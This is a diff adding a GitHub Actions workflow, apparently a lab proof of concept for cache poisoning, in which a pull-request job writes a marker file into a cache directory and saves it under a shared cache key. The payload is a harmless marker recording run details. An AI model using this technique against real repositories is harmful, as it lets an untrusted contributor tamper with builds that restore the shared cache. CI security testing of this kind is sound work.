@@ -1,0 +1,19 @@
+name: poison
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  poison:
+    runs-on: ubuntu-latest
+    steps:
+      - name: write poison payload into cache dir
+        run: |
+          mkdir -p cachedir
+          echo "POISONED_BY_FORK_PR actor=$GITHUB_ACTOR run=$GITHUB_RUN_ID" > cachedir/marker.txt
+          echo "ref=$GITHUB_REF sha=$GITHUB_SHA event=$GITHUB_EVENT_NAME repo=$GITHUB_REPOSITORY" >> cachedir/marker.txt
+      - name: save cache under the shared key
+        uses: actions/cache/save@v4
+        with:
+          path: cachedir
+          key: ci-cache-lab-shared-key-v1
